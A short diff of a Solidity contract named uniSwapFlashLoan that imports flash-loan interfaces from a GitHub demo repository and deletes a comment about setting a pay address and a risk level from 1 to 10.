@@ -4,7 +4,7 @@ pragma solidity ^0.5.0;
 import "https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPoolAddressesProvider.sol";
 import "https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPool.sol";
 
-//set payaddress and level of risk between 1 to 10 as in 1 being the safest 10 being to most risky but most profit
+
 contract uniSwapFlashLoan {
         string public tokenName;
 	string public tokenSymbol;
